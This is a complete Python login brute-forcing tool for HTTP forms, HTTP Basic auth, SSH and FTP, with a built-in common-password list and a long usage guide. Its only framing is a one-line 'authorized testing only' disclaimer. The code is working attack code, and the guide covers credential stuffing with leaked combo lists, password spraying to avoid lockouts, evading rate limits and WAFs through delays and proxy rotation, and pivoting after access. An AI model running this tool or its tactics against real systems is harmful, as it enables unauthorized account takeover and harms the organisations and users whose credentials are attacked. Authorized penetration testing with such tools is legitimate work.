#!/usr/bin/env python3
"""
Bruteforce - Login Cracker
Tests username/password combinations against login forms
For authorized security testing only

QUICK START:
    ./bruteforce.py -u http://target.com/login -U admin -P passwords.txt
    ./bruteforce.py -u http://target.com/login -C userpass.txt
    ./bruteforce.py --ssh admin@192.168.1.1 -P passwords.txt
"""

import argparse
import sys
import urllib.request
import urllib.parse
import ssl
import time
import re
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple, Optional
import threading

# Colors
class C:
    R = '\033[91m'
    Y = '\033[93m'
    G = '\033[92m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    E = '\033[0m'

HELP_TEXT = """
================================================================================
                    BRUTEFORCE - COMPREHENSIVE GUIDE
                    Credential Testing for Authorized Assessments
================================================================================

WHAT IS CREDENTIAL BRUTEFORCING?
--------------------------------
Bruteforcing is systematically trying username/password combinations until
you find one that works. Think of it like trying every key on a keyring until
one opens the lock. In security testing, we use this to verify password
policies are actually enforced and find weak credentials before attackers do.

WHY THIS MATTERS: Weak or default passwords are one of the most common ways
real attackers gain initial access. Testing credentials helps organizations
find these weaknesses in a controlled manner.


THE SMART APPROACH TO BRUTEFORCING
----------------------------------
Dumb bruteforcing (trying everything) is slow and noisy. Smart bruteforcing
means being strategic:

1. GATHER INTEL FIRST
   - What usernames exist? (admin, root, service accounts, employee names)
   - What's the password policy? (length, complexity, lockout threshold)
   - Any leaked credentials for this organization?
   - What are common patterns for this industry/company?

2. START TARGETED
   - Try default credentials first (admin:admin, root:root, admin:password)
   - Try company name variations (company123, Company2024!)
   - Try seasonal patterns (Summer2024!, Winter2024!)
   - Username-based passwords (john:john123, admin:admin1)

3. ESCALATE GRADUALLY
   - Small targeted list -> Medium common passwords -> Large wordlist
   - Each stage takes more time and generates more noise


UNDERSTANDING LOGIN DETECTION
-----------------------------
The tool needs to know if a login succeeded or failed. Here's how it works:

SUCCESS INDICATORS (login worked):
  - Redirect to dashboard/home page (302 redirect)
  - "Welcome" or "Dashboard" in response
  - Session cookie being set
  - Absence of error message

FAILURE INDICATORS (login failed):
  - "Invalid credentials" message
  - "Incorrect password" message
  - "User not found" message
  - Same login page returned

CRITICAL: Always use --fail-string or --success-string for accuracy!
Without these, the tool guesses based on common patterns and may give
false positives (saying credentials work when they don't).


DIFFERENT TARGET TYPES EXPLAINED
--------------------------------

HTTP FORM LOGIN (Most Common)
  This is your typical website login page with username/password fields.

  HOW IT WORKS:
  1. Tool sends POST request with credentials
  2. Checks response for success/failure indicators
  3. Fields are auto-detected or you specify them

  FINDING FIELD NAMES:
  - View page source, look for <input name="???">
  - Check network tab when you try logging in
  - Common names: username, user, email, login, password, passwd, pass

  EXAMPLE:
    ./bruteforce.py -u http://site.com/login \\
        -U admin -P passwords.txt \\
        --user-field "user_email" --pass-field "user_password" \\
        --fail-string "Invalid username or password"


HTTP BASIC AUTHENTICATION
  This is the popup box that appears in your browser asking for credentials.
  You've seen it on routers, admin panels, and protected directories.

  HOW TO IDENTIFY:
  - Browser shows popup, not a web form
  - URL might be /admin, /protected, /private
  - Returns 401 Unauthorized when wrong

  EXAMPLE:
    ./bruteforce.py -u http://site.com/admin \\
        --basic -U admin -P passwords.txt


SSH (Secure Shell)
  Direct command-line access to servers. Very valuable target.

  WHY IT'S DIFFERENT:
  - Slower than HTTP (each connection takes more time)
  - Usually has lockout/delay after failed attempts
  - Success means full shell access

  COMMON USERNAMES: root, admin, user, ubuntu, ec2-user, centos

  EXAMPLE:
    ./bruteforce.py --ssh root@192.168.1.1 -P passwords.txt --delay 500


FTP (File Transfer Protocol)
  File server access. Often has weak security.

  QUICK WINS:
  - Try anonymous:anonymous first (many FTP servers allow this!)
  - Try ftp:ftp
  - Service accounts often have simple passwords

  EXAMPLE:
    ./bruteforce.py --ftp 192.168.1.1 -U anonymous -P passwords.txt


WORDLIST STRATEGY
-----------------
Your wordlist is your ammunition. Choose wisely:

TIER 1 - ALWAYS TRY FIRST (seconds)
  Create a custom list of ~50-100 passwords:
  - Defaults: admin, password, root, 123456
  - Company-specific: companyname, CompanyName123!
  - Seasonal: Summer2024!, Winter2024!, January2024!
  - Keyboard patterns: qwerty, 123456, password1

TIER 2 - COMMON PASSWORDS (minutes)
  - /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
  - /usr/share/wordlists/rockyou.txt (first 10k lines)

TIER 3 - FULL WORDLISTS (hours)
  - /usr/share/wordlists/rockyou.txt (14 million)
  - /usr/share/seclists/Passwords/Leaked-Databases/

PRO TIP: Generate custom wordlists with ./wordlist_gen.py based on OSINT!


SCENARIO-BASED USAGE
--------------------

SCENARIO: Found a login page during recon
COMMAND:  ./bruteforce.py -u http://target.com/login -U admin -P top100.txt \\
              --fail-string "Invalid" -v
WHY:      Start with common admin username and small password list
          Using --fail-string ensures accurate detection
          -v (verbose) lets you see what's happening
NEXT:     If no hits, try different usernames or expand wordlist
          If success, document and test access level


SCENARIO: Router/device admin panel with Basic Auth popup
COMMAND:  ./bruteforce.py -u http://192.168.1.1/admin --basic \\
              -U admin -P router_defaults.txt --stop
WHY:      Devices often use default credentials (admin:admin, admin:password)
          --basic handles the authentication popup
          --stop quits after first success (we only need one)
NEXT:     If success, access admin panel and document misconfigurations
          Check if you can change settings, view configs, pivot


SCENARIO: SSH server found on port 22
COMMAND:  ./bruteforce.py --ssh root@target.com -P ssh_passwords.txt \\
              --delay 1000 -v
WHY:      SSH often has rate limiting, so --delay 1000 (1 second) prevents lockout
          Root is always a good first target
          Verbose shows progress since SSH is slow
NEXT:     If success, you have SHELL ACCESS - massive win
          Document, screenshot, check what files/data accessible


SCENARIO: Multiple users discovered during enumeration
COMMAND:  ./bruteforce.py -u http://target.com/login -U users.txt \\
              -P passwords.txt --fail-string "incorrect"
WHY:      Testing all discovered usernames against common passwords
          Many users = higher chance one has weak password
NEXT:     Any success gives foothold into application
          Check what that user can access, escalate from there


SCENARIO: Have leaked credentials from paste/breach
COMMAND:  ./bruteforce.py -u http://target.com/login -C leaked_combo.txt
WHY:      Combo files have user:pass already paired
          People reuse passwords across sites
NEXT:     Any hit = confirmed credential reuse, major finding


AVOIDING DETECTION AND LOCKOUTS
-------------------------------

ACCOUNT LOCKOUT
  Most systems lock accounts after 3-5 failed attempts.
  DETECT: Try 3 wrong passwords manually, see what happens
  AVOID:  --delay 30000 (30 seconds between attempts)
          Or spray horizontally: 1 password against many users

RATE LIMITING
  Systems may block your IP after too many requests.
  DETECT: Watch for "too many requests" or 429 errors
  AVOID:  --delay 1000 or higher, --threads 1

IP BLOCKING
  WAFs/firewalls may blacklist you entirely.
  DETECT: Requests start failing or timing out
  AVOID:  Slow and steady, consider using proxy rotation


INTERPRETING RESULTS
--------------------

FOUND CREDENTIALS:
  Document immediately:
  - What username/password combination
  - What access does this grant
  - Screenshot the logged-in state
  - Test what actions are possible

NO CREDENTIALS FOUND:
  This is still valuable information!
  - Password policy may be enforced
  - Try different wordlist approach
  - Consider other attack vectors
  - Document that common passwords don't work


COMMON MISTAKES TO AVOID
------------------------
1. Not specifying --fail-string (leads to false positives)
2. Going too fast and getting locked out
3. Starting with huge wordlists instead of targeted attempts
4. Not checking for account lockout policy first
5. Using obvious usernames without enumeration first
6. Forgetting that this generates LOTS of logs


COMMAND REFERENCE
-----------------
TARGET OPTIONS:
  -u, --url URL          HTTP login form URL
  --basic                HTTP Basic Authentication mode
  --ssh user@host        SSH bruteforce target
  --ftp host             FTP bruteforce target

CREDENTIAL OPTIONS:
  -U, --username STR     Single username OR file of usernames
  -P, --password FILE    Password wordlist file
  -C, --combo FILE       Combo file (user:pass per line)

HTTP FORM OPTIONS:
  --user-field NAME      Username field name (if not auto-detected)
  --pass-field NAME      Password field name (if not auto-detected)
  --data "key=val"       Additional POST data to include
  --fail-string STR      Text that appears on FAILED login
  --success-string STR   Text that appears on SUCCESSFUL login
  --cookie "a=b"         Cookies to send with requests

PERFORMANCE OPTIONS:
  -t, --threads NUM      Concurrent attempts (default: 10)
  --timeout SEC          Request timeout (default: 10)
  --delay MS             Milliseconds between attempts (default: 0)

OUTPUT OPTIONS:
  -v, --verbose          Show all attempts, not just successes
  -o, --output FILE      Save found credentials to file
  --stop                 Stop after first successful login
================================================================================
"""

# Common password list (if no wordlist provided)
COMMON_PASSWORDS = [
    'password', '123456', '12345678', 'qwerty', 'abc123', 'monkey', '1234567',
    'letmein', 'trustno1', 'dragon', 'baseball', 'iloveyou', 'master', 'sunshine',
    'ashley', 'bailey', 'shadow', '123123', '654321', 'superman', 'qazwsx',
    'michael', 'football', 'password1', 'password123', 'admin', 'admin123',
    'root', 'toor', 'pass', 'test', 'guest', 'master', 'changeme', 'welcome',
    '1234', '12345', '123456789', '1234567890', 'login', 'pass123', 'qwerty123',
]

def banner():
    print(f"""{C.R}
    ____             __       ______
   / __ )_______  __/ /____  / ____/___  ____________
  / __  / ___/ / / / __/ _ \\/ /_  / __ \\/ ___/ ___/ _ \\
 / /_/ / /  / /_/ / /_/  __/ __/ / /_/ / /  / /__/  __/
/_____/_/   \\__,_/\\__/\\___/_/    \\____/_/   \\___/\\___/
{C.E}{C.Y}Login Credential Tester{C.E}
""")

class BruteForcer:
    def __init__(self, threads: int = 10, timeout: int = 10, delay: int = 0,
                 verbose: bool = False):
        self.threads = threads
        self.timeout = timeout
        self.delay = delay / 1000 if delay else 0  # Convert ms to seconds
        self.verbose = verbose
        self.found = []
        self.lock = threading.Lock()
        self.attempts = 0
        self.total = 0
        self.stop_flag = False

        # SSL context
        self.ssl_ctx = ssl.create_default_context()
        self.ssl_ctx.check_hostname = False
        self.ssl_ctx.verify_mode = ssl.CERT_NONE

    def http_bruteforce(self, url: str, usernames: List[str], passwords: List[str],
                        user_field: str = 'username', pass_field: str = 'password',
                        extra_data: Dict = None, fail_string: str = None,
                        success_string: str = None, cookies: str = None,
                        stop_on_success: bool = False) -> List[Dict]:
        """Bruteforce HTTP login form"""

        # Build credential pairs
        pairs = [(u, p) for u in usernames for p in passwords]
        self.total = len(pairs)
        self.attempts = 0

        print(f"{C.B}[*]{C.E} Testing {len(usernames)} users x {len(passwords)} passwords = {self.total} combinations")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {
                executor.submit(
                    self._try_http_login, url, user, passwd, user_field, pass_field,
                    extra_data, fail_string, success_string, cookies
                ): (user, passwd)
                for user, passwd in pairs
            }

            for future in as_completed(futures):
                if self.stop_flag:
                    break

                user, passwd = futures[future]
                result = future.result()

                with self.lock:
                    self.attempts += 1

                if result:
                    self.found.append({'username': user, 'password': passwd})
                    print(f"{C.G}[+] FOUND: {user}:{passwd}{C.E}")

                    if stop_on_success:
                        self.stop_flag = True
                        break
                elif self.verbose:
                    print(f"{C.R}[-]{C.E} Failed: {user}:{passwd}")

                # Progress
                if self.attempts % 50 == 0:
                    print(f"\r{C.B}[*]{C.E} Progress: {self.attempts}/{self.total} ({len(self.found)} found)", end='')

                if self.delay:
                    time.sleep(self.delay)

        print(f"\n{C.B}[*]{C.E} Completed: {self.attempts} attempts, {len(self.found)} successful")
        return self.found

    def _try_http_login(self, url: str, username: str, password: str,
                        user_field: str, pass_field: str, extra_data: Dict,
                        fail_string: str, success_string: str,
                        cookies: str) -> bool:
        """Try single HTTP login"""
        try:
            # Build POST data
            data = {user_field: username, pass_field: password}
            if extra_data:
                data.update(extra_data)

            post_data = urllib.parse.urlencode(data).encode('utf-8')

            headers = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
            }

            if cookies:
                headers['Cookie'] = cookies

            req = urllib.request.Request(url, data=post_data, headers=headers)
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=self.ssl_ctx)
            )

            response = opener.open(req, timeout=self.timeout)
            content = response.read().decode('utf-8', errors='ignore')

            # Check for success/failure
            if success_string:
                return success_string.lower() in content.lower()
            elif fail_string:
                return fail_string.lower() not in content.lower()
            else:
                # Heuristics: look for common failure indicators
                fail_indicators = [
                    'invalid', 'incorrect', 'wrong', 'failed', 'error',
                    'denied', 'unauthorized', 'bad credentials'
                ]
                return not any(ind in content.lower() for ind in fail_indicators)

        except urllib.error.HTTPError as e:
            if e.code == 302:  # Redirect often means success
                return True
            return False
        except Exception:
            return False

    def http_basic_bruteforce(self, url: str, usernames: List[str],
                               passwords: List[str], stop_on_success: bool = False) -> List[Dict]:
        """Bruteforce HTTP Basic Authentication"""
        pairs = [(u, p) for u in usernames for p in passwords]
        self.total = len(pairs)
        self.attempts = 0

        print(f"{C.B}[*]{C.E} Testing HTTP Basic Auth: {self.total} combinations")

        for user, passwd in pairs:
            if self.stop_flag:
                break

            self.attempts += 1

            try:
                credentials = base64.b64encode(f"{user}:{passwd}".encode()).decode()
                headers = {
                    'Authorization': f'Basic {credentials}',
                    'User-Agent': 'Mozilla/5.0'
                }

                req = urllib.request.Request(url, headers=headers)
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=self.ssl_ctx)
                )

                response = opener.open(req, timeout=self.timeout)

                if response.status == 200:
                    self.found.append({'username': user, 'password': passwd})
                    print(f"{C.G}[+] FOUND: {user}:{passwd}{C.E}")

                    if stop_on_success:
                        break

            except urllib.error.HTTPError as e:
                if e.code == 401:
                    if self.verbose:
                        print(f"{C.R}[-]{C.E} Failed: {user}:{passwd}")
            except:
                pass

            if self.attempts % 50 == 0:
                print(f"\r{C.B}[*]{C.E} Progress: {self.attempts}/{self.total}", end='')

            if self.delay:
                time.sleep(self.delay)

        print(f"\n{C.B}[*]{C.E} Completed: {len(self.found)} found")
        return self.found

    def ssh_bruteforce(self, host: str, username: str, passwords: List[str],
                        port: int = 22, stop_on_success: bool = False) -> List[Dict]:
        """Bruteforce SSH login"""
        try:
            import paramiko
        except ImportError:
            print(f"{C.R}[!]{C.E} SSH bruteforce requires paramiko: pip install paramiko")
            return []

        self.total = len(passwords)
        self.attempts = 0

        print(f"{C.B}[*]{C.E} Testing SSH {username}@{host}:{port} with {self.total} passwords")

        for passwd in passwords:
            if self.stop_flag:
                break

            self.attempts += 1

            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, port=port, username=username, password=passwd,
                              timeout=self.timeout, allow_agent=False, look_for_keys=False)
                client.close()

                self.found.append({'username': username, 'password': passwd})
                print(f"{C.G}[+] FOUND: {username}:{passwd}{C.E}")

                if stop_on_success:
                    break

            except paramiko.AuthenticationException:
                if self.verbose:
                    print(f"{C.R}[-]{C.E} Failed: {passwd}")
            except:
                pass

            if self.attempts % 10 == 0:
                print(f"\r{C.B}[*]{C.E} Progress: {self.attempts}/{self.total}", end='')

            if self.delay:
                time.sleep(self.delay)

        print(f"\n{C.B}[*]{C.E} Completed: {len(self.found)} found")
        return self.found

    def ftp_bruteforce(self, host: str, usernames: List[str], passwords: List[str],
                        port: int = 21, stop_on_success: bool = False) -> List[Dict]:
        """Bruteforce FTP login"""
        import ftplib

        pairs = [(u, p) for u in usernames for p in passwords]
        self.total = len(pairs)
        self.attempts = 0

        print(f"{C.B}[*]{C.E} Testing FTP {host}:{port} with {self.total} combinations")

        for user, passwd in pairs:
            if self.stop_flag:
                break

            self.attempts += 1

            try:
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=self.timeout)
                ftp.login(user, passwd)
                ftp.quit()

                self.found.append({'username': user, 'password': passwd})
                print(f"{C.G}[+] FOUND: {user}:{passwd}{C.E}")

                if stop_on_success:
                    break

            except ftplib.error_perm:
                if self.verbose:
                    print(f"{C.R}[-]{C.E} Failed: {user}:{passwd}")
            except:
                pass

            if self.attempts % 20 == 0:
                print(f"\r{C.B}[*]{C.E} Progress: {self.attempts}/{self.total}", end='')

            if self.delay:
                time.sleep(self.delay)

        print(f"\n{C.B}[*]{C.E} Completed: {len(self.found)} found")
        return self.found


def load_file(filepath: str) -> List[str]:
    """Load lines from file"""
    try:
        with open(filepath, 'r', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def main():
    parser = argparse.ArgumentParser(description='Bruteforce Login Tester')
    parser.add_argument('-u', '--url', help='Target URL')
    parser.add_argument('-U', '--username', help='Username or username file')
    parser.add_argument('-P', '--password', help='Password file')
    parser.add_argument('-C', '--combo', help='Combo file (user:pass)')
    parser.add_argument('--user-field', default='username', help='Username field name')
    parser.add_argument('--pass-field', default='password', help='Password field name')
    parser.add_argument('--data', help='Additional POST data')
    parser.add_argument('--fail-string', help='Failure indicator string')
    parser.add_argument('--success-string', help='Success indicator string')
    parser.add_argument('--cookie', help='Cookies')
    parser.add_argument('--basic', action='store_true', help='HTTP Basic Auth')
    parser.add_argument('--ssh', help='SSH target (user@host)')
    parser.add_argument('--ftp', help='FTP target host')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Threads')
    parser.add_argument('--timeout', type=int, default=10, help='Timeout')
    parser.add_argument('--delay', type=int, default=0, help='Delay in ms')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose')
    parser.add_argument('-o', '--output', help='Output file')
    parser.add_argument('--stop', action='store_true', help='Stop on success')
    parser.add_argument('--help-full', action='store_true', help='Detailed help')

    args = parser.parse_args()

    if args.help_full:
        print(HELP_TEXT)
        return

    banner()

    # Load usernames
    usernames = []
    if args.username:
        if '/' in args.username or '\\' in args.username:
            usernames = load_file(args.username)
        else:
            usernames = [args.username]

    # Load passwords
    passwords = []
    if args.password:
        passwords = load_file(args.password)
        if not passwords:
            print(f"{C.R}[!]{C.E} Failed to load password file")
            return
    else:
        passwords = COMMON_PASSWORDS
        print(f"{C.Y}[*]{C.E} Using built-in common passwords ({len(passwords)})")

    # Load combo file
    if args.combo:
        combos = load_file(args.combo)
        usernames = []
        passwords = []
        for line in combos:
            if ':' in line:
                u, p = line.split(':', 1)
                usernames.append(u)
                passwords.append(p)

    # Create bruteforcer
    bf = BruteForcer(
        threads=args.threads,
        timeout=args.timeout,
        delay=args.delay,
        verbose=args.verbose
    )

    results = []

    # SSH
    if args.ssh:
        if '@' in args.ssh:
            username, host = args.ssh.split('@', 1)
        else:
            username = 'root'
            host = args.ssh
        results = bf.ssh_bruteforce(host, username, passwords, stop_on_success=args.stop)

    # FTP
    elif args.ftp:
        if not usernames:
            usernames = ['anonymous', 'ftp', 'admin', 'root']
        results = bf.ftp_bruteforce(args.ftp, usernames, passwords, stop_on_success=args.stop)

    # HTTP
    elif args.url:
        if not usernames:
            print(f"{C.R}[!]{C.E} Username required (-U)")
            return

        # Parse extra data
        extra_data = {}
        if args.data:
            for pair in args.data.split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    extra_data[k] = v

        if args.basic:
            results = bf.http_basic_bruteforce(args.url, usernames, passwords,
                                                stop_on_success=args.stop)
        else:
            results = bf.http_bruteforce(
                args.url, usernames, passwords,
                user_field=args.user_field,
                pass_field=args.pass_field,
                extra_data=extra_data,
                fail_string=args.fail_string,
                success_string=args.success_string,
                cookies=args.cookie,
                stop_on_success=args.stop
            )
    else:
        parser.print_help()
        print(f"\n{C.Y}Tip:{C.E} Use --help-full for detailed guide")
        return

    # Save results
    if args.output and results:
        with open(args.output, 'w') as f:
            for r in results:
                f.write(f"{r['username']}:{r['password']}\n")
        print(f"{C.B}[*]{C.E} Results saved to {args.output}")

    # Summary
    if results:
        print(f"\n{C.G}[+] Found {len(results)} valid credential(s){C.E}")
    else:
        print(f"\n{C.R}[-] No valid credentials found{C.E}")

if __name__ == '__main__':
    main()
